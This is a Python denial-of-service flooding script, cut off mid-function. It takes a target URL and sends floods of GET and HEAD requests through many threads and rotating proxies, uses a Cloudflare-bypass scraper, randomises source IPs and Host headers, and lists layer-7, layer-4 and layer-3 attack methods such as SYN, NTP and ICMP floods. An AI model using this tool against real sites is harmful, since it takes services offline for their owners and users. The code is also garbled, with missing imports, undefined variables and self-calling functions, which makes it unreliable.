import threading
from threading import Thread, Timer
import requests
from concurrent.futures import ThreadPoolExecutor
from random import choice, randint
from socket import socket, AF_INET, SOCK_STREAM, error
from time import sleep
import socket, threading
from threading import Thread
import random
import time
import socket


# def
url = input("Url | >> ")
thread = int(input("Time | >> "))


def atk_1():
    while True:
        r = requests.get(url, data="158.69.121.40:7777,158.69.121.40:7777,37.120.192.154:8080")
        print(r.status_code, "| Attack Sucess |")


executor = ThreadPoolExecutor(max_workers=int(1000000000000))


def attack():
    while True:

        a = socket(AF_INET, SOCK_STREAM)
        for _ in range(100):

            for _ in range(100):
                a.send(
                    str.encode(
                        f"HEAD {url} HTTP/2.0\r\nHost:  {str(randint(1,255))}.{str(randint(1,255))}.{str(randint(1,255))}.{str(randint(1,255))}\r\n\r\n\r\n"
                    ))


def send2attack():
    for _ in range(2):
        for _ in range(500):
            executor.submit(attack)
    sleep(3)


def opth():
    for a in range(thr):
        x = threading.Thread(target=atk_1)
        x.start()
        print("Threads Running : " + str(a + 1))
    print("[!] Wait For Ready Threads...")
    time.sleep(20)
    input("[+] PRESS [ ENTER ] To START ATTACK")
    global oo
    oo = True


oo = False


def main():
    global url
    global list
    global pprr
    global thr
    global per
    
    thr = int(input(f"[+] Threads (1-1000): "))
    per = int(input("[!] Req Power (1-100) : "))
    opth()


def atk():
    pprr = open(list).readlines()
    proxy = random.choice(pprr).strip().split(":")
    s = cfscrape.create_scraper()
    s.proxies = {}
    s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
    s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
    time.sleep(10)
    while True:
        while oo:
            try:
                s.get(url)
                print('PROXY ' + str(proxy[0]) + ":" + str(proxy[1]) +
                      ' Attack ' + str(url))
                try:
                    for g in range(per):
                        s.get(url)
                        print('PROXY ' + str(proxy[0]) + ":" + str(proxy[1]) +
                              ' Attack ' + str(url))
                        Thread(target=atk).start()
                    #s.close()
                except:
                    s.close()
            except:
                s.close()
                print("Proxy is not response..")


if __name__ == "__main__":
    main()



l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
l4 = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP"]
l3 = ["POD", "ICMP"]
to = ["CFIP", "DNS", "PING", "CHECK", "DSTAT", "INFO"]
ot = ["STOP", "TOOLS", "HELP"]
methods = l7 + l4 + l3
methodsl = l7 + l4 + l3 + to + ot



def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled


def UrlFixer(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)



def head(event, socks_type):
    proxy = (random).strip().split(":")
    header = head("head")
    head_host = "HEAD " + path + "?" + random() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < Timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            
            try:
                for _ in range(threading):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def downloadsocks(choice):
    global out_file
    if choice == "4":
        f = open